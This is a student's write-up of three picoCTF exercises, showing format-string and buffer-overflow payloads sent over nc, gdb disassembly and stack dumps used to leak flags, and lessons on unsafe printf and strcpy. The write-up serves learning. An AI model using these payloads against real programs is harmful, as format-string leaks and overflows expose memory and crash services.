# format string 0

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}`

## My Solve
Firstly looking at the challenge name `format string 0` and the hint I figured out that we need to somehow make use of format specifiers to solve the challenge.
* Looking at the code it's clear that firstly a file named `flag.txt` has to be present in our working directory.
  ![image](https://github.com/user-attachments/assets/4d078bd0-5840-4477-b68d-eb4bd99568b6)

```
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ echo "flag" > flag.txt
```
* After that i initiated the challenge
```
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ nc mimas.picoctf.net 55252
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
```
* Here we can clearly see that `Gr%114d_Cheese` is on the menu and has a format specifier `%114d` so thats our input for this instance. Thus satifying the 2 conditions in the code.

  ![image](https://github.com/user-attachments/assets/5da018d1-bbcd-4c52-9b0d-2454eb0260be)

```
Enter your recommendation: Gr%114d_Cheese 
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
```
* Now only `Cla%sic_Che%s%steak` has the format specifier `%s` so thats our input for this instance.
![image](https://github.com/user-attachments/assets/93080017-7b07-4669-b715-ebb18f7aaace)

```
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}
```
And thus we get our flag

## Incorrect Tangents I Went On
Initially when i looked at the code for the program. The following part stuck out to me.

![image](https://github.com/user-attachments/assets/5901f25f-11dd-455c-a7c4-3f26bdfd84af)

I thought that if we input a random string greater than `2 * BUFSIZE` i.e. 64 then `serve_bob` would be called from within `serve_patrick` but it did not work as our input must be on the `menu` therefore `Gr%114d_Cheese` works which is on the menu and inputs a integer whose size is more than 64 thus calling the `serve_bob` function.

## What I Learned
Its never a good idea to expect input from the user which includes format specifiers as it can lead to unexpected behaviour which can be dangerous. As the challenge was relatively easy I did not require any references.

# buffer overflow 0

**Flag:** picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}

## My Solve
By looking at the source code of the program given to us we can clearly see some faults in the code, and as the name of the challenge is `buffer overflow` it is clear that we need to somehow overflow the buffer (`buf`) variables.

* We can see that the program expects a input from us and stores it in `buf1`.

  ![image](https://github.com/user-attachments/assets/ea881f04-4341-47df-a3b4-984b3c6b33e9)


* `buf1` is then sent to the `vuln` function where it gets copied to `buf2`. But the problem here is that `buf2` can only store a maximum of 16 bytes.

  ![image](https://github.com/user-attachments/assets/ea7d9e1a-7bcd-4b63-8393-e53025208c36)


* Thus giving a input of 17 bytes or more will cause a segmentation fault and give us the required flag.
```
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ nc saturn.picoctf.net 54684
Input: AAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Incorrect Tangents I Went On
As my initial approach of overflowing `buf2` worked i did not go on any incorrect tangents.

## What I Learned
The use of `strcpy` to copy a string into another string without checking for the correct size can lead to unintended overflow. Thus we need to be careful of these sort of problems.

# flag leak
**Flag:** picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}

## My Solve
Firstly created our debugging flag and made the program executable.
```
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ echo "picoCTF{debugging_flag}" > flag.txt
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ chmod +x vuln
```

Now looking at the source code provided to us we can see that there is a `format string` vulnerability in the program.
```
printf("Here's a story - \n");
printf(story);
```
Now before trying to exploit this I opened the program in `gdb` and tried disassembling the `vuln`function.
```
gef➤  disassemble vuln
Dump of assembler code for function vuln:
   0x08049333 <+0>:	endbr32 
   0x08049337 <+4>:	push   ebp
   0x08049338 <+5>:	mov    ebp,esp
   0x0804933a <+7>:	push   ebx
   0x0804933b <+8>:	sub    esp,0xc4
   0x08049341 <+14>:	call   0x80491f0 <__x86.get_pc_thunk.bx>
   0x08049346 <+19>:	add    ebx,0x2cba
   0x0804934c <+25>:	sub    esp,0x8
   0x0804934f <+28>:	push   0x40
   0x08049351 <+30>:	lea    eax,[ebp-0x48]
   0x08049354 <+33>:	push   eax
   0x08049355 <+34>:	call   0x80492b6 <readflag>
   0x0804935a <+39>:	add    esp,0x10
   0x0804935d <+42>:	sub    esp,0xc
   0x08049360 <+45>:	lea    eax,[ebx-0x1f9c]
   0x08049366 <+51>:	push   eax
   0x08049367 <+52>:	call   0x80490f0 <printf@plt>
   0x0804936c <+57>:	add    esp,0x10
   0x0804936f <+60>:	sub    esp,0x8
   0x08049372 <+63>:	lea    eax,[ebp-0xc8]
   0x08049378 <+69>:	push   eax
   0x08049379 <+70>:	lea    eax,[ebx-0x1f6d]
   0x0804937f <+76>:	push   eax
   0x08049380 <+77>:	call   0x8049180 <__isoc99_scanf@plt>
   0x08049385 <+82>:	add    esp,0x10
   0x08049388 <+85>:	sub    esp,0xc
   0x0804938b <+88>:	lea    eax,[ebx-0x1f67]
   0x08049391 <+94>:	push   eax
   0x08049392 <+95>:	call   0x8049120 <puts@plt>
   0x08049397 <+100>:	add    esp,0x10
   0x0804939a <+103>:	sub    esp,0xc
   0x0804939d <+106>:	lea    eax,[ebp-0xc8]
   0x080493a3 <+112>:	push   eax
   0x080493a4 <+113>:	call   0x80490f0 <printf@plt>
   0x080493a9 <+118>:	add    esp,0x10
   0x080493ac <+121>:	sub    esp,0xc
   0x080493af <+124>:	push   0xa
   0x080493b1 <+126>:	call   0x8049170 <putchar@plt>
   0x080493b6 <+131>:	add    esp,0x10
   0x080493b9 <+134>:	nop
   0x080493ba <+135>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080493bd <+138>:	leave  
   0x080493be <+139>:	ret    
End of assembler dump.
```
Here we can see that `readflag` gets called at `+34` so I set a breakpoint just after that at `+39` to see if we can see our debugging flag anywhere.
```
gef➤  break *(vuln+39)
Breakpoint 1 at 0x804935a
gef➤  run
```
Now looking at the stack at this point in the code:
```
0xffffcff0│+0x0000: 0xffffd080  →  "picoCTF{debugging_flag}\n"	 ← $esp
0xffffcff4│+0x0004: 0x00000040 ("@"?)
0xffffcff8│+0x0008: 0xf7d8b374  →  0x74656e00
0xffffcffc│+0x000c: 0x08049346  →  <vuln+0013> add ebx, 0x2cba
0xffffd000│+0x0010: 0xf7fbe4a0  →  0xf7d79000  →  0x464c457f
0xffffd004│+0x0014: 0xffffffff
0xffffd008│+0x0018: 0xffffd084  →  "CTF{debugging_flag}\n"
0xffffd00c│+0x001c: 0xf7d86e54  →  0x0000205e ("^ "?)
```
We can see that two addresses `0xffffd080` and `0xffffd084` point to our flag. Now as there is not much to do we go back to exploiting the `format string vulnerability`

After running the program I typed invarious variations of `%x` and `%s` and clearly we can see that a payload of `%x`s returns what looks like memory addresses.
```
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ ./vuln
Tell me a story and then I'll tell you one >> %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Here's a story - 
ffd02f10.ebfd0374.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.78252e.0.ec2037b0.1.1
```
but after trying a lot, the two addresses which pointed to our flag, does not seem to show up anywhere. So i went back to the drawing board and looked at the stack again. In the stack we can see that the `first` position and the `24th` position store our flag. But as the topmost element that is the first element might get overriden the `24th` position seems promising.

Image

After reading a little bit, I found that to leak a particular element of the stack we can set a payload of `%i$x` where `i` is the position of the stack we want to leak.

So I connected to the remote server. Tried this payload and it still didnt seem to work
```
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ nc saturn.picoctf.net 64182
Tell me a story and then I'll tell you one >> %24$x
Here's a story - 
ffd67d44
```
But i made a mistake as `%x` would return a hexadecimal value and not a string so I changed the payload to `%24$s` and we get a portion of our flag. Joining `pico` at the beginning we get the complete flag.
```
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ nc saturn.picoctf.net 64182
Tell me a story and then I'll tell you one >> %24$s
Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}
```

## Incorrect Tangents I Went On
+ Initially tried to overflow `story` as it could only hold `128` character long strign which did not work.
+ Tried to input a bunch of `%x`s to somehow get the address which i was talking which again did not work.
+ tried dissasembling the `readflag` function also to look for additional stuff but at this point I was getting way off track.
+ For some reason the payload of `%24$s` was not working on the program but worked on the remote server i dont really know why
  ```
  devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ ./vuln
  Tell me a story and then I'll tell you one >> %24$s
  Here's a story - 
  Segmentation fault (core dumped)
  ```

## What I Learned
Learned how to exploit a very specific type of format string vulnerability which involves looking at the `stack` of the program at a given point and trying to leak it to get our flag.

## References
[Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
